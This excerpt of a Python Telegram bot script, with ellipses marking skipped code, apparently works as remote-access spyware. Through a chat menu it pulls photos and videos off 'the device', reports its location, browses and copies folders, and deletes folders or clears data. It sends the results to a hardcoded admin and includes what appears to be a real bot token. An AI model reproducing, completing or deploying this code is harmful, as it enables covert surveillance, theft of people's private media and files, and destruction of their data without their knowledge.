...
TOKEN = '7516709523:AAHZQPb3mag94GaEnPXP0za87u6MQFpT-D8' #PUT YOURS
ADMIN_ID = '7440623535'' #PUT YOURS
bot = TeleBot(TOKEN)
...
def start(message):
    ...
    button1 = types.InlineKeyboardButton(' Extract images 📸', callback_data='extract_photos')
    button2 = types.InlineKeyboardButton('Clear Data 🗑️', callback_data='clear_data')
    ...
    button5 = types.InlineKeyboardButton('Search Video 🎥', callback_data='search_videos')
    button6 = types.InlineKeyboardButton('Location', callback_data='location')
    button7 = types.InlineKeyboardButton('Total Files', callback_data='files')
...
def show_directory_contents(message, directory, page):
    ...
    if end < len(all_items):
        next_button = types.InlineKeyboardButton('page next', callback_data=f'page_{hash_path(directory)}_{page+1}')
    ...
    if message.reply_to_message:
        ...
        bot.send_message(chat_id, f"Folder Contents: {directory}", reply_markup=keyboard)
...
def ask_for_photo_count(call):
    ...
    bot.send_message(call.message.chat.id, f'There are currently {photo_count} photos on the device. How many photos do you want to get? 📸')
...
def process_photo_count(message, root_directory, specific_folders):
    try:
        ...
        bot.send_message(message.chat.id, 'Please enter the correct number of photos. 📸')
        return
...
def clear_data(call):
    ...
    try:
        ...
        bot.send_message(call.message.chat.id, 'Data has been successfully cleared. 🗑️')
    except Exception as e:
...
def process_folder_name(message):
    ...
    if not folder_path:
        bot.send_message(message.chat.id, f'Folder "{folder_name}" was not found. 🚫')
        ask_to_return_to_menu(message, 'copy_data')
        return
    
    if is_folder_too_large(folder_path):
        bot.send_message(message.chat.id, 'Expect the contents of the folder to be quite heavy. 📦')
...
def process_delete_folder_name(message):
    ...
    try:
        ...
        bot.send_message(message.chat.id, f'Folder "{folder_name}" has been successfully deleted. 🗑️')
    except Exception as e:
...
def ask_for_video_count(call):
    ...
    bot.send_message(call.message.chat.id, f'Currently on device {video_count} videos. How many videos do you want? 🎥')
...
def ask_to_return_to_menu(message, task):
    ...
    bot.send_message(message.chat.id,'Do you want to go back to the list? 🔄', reply_markup=keyboard)
...
def repeat_task(call):
    ...
    if task == 'extract_photos':
        ...
        bot.send_message(call.message.chat.id, 'Ok, Ill wait for your actions. You can contact the list using the button below. 🔄', reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton('Menu', callback_data='return_to_menu')))
...
""" + Fore.RED + "║" + Style.RESET_ALL + r"""                     PROGRAMMER : @MYEHRA                       """ + Fore.RED + "║" + Style.RESET_ALL + r""" 
...
def notify_admin():
    bot.send_message(ADMIN_ID, "Attention! The bot has been launched. You can start working /start 🚀")
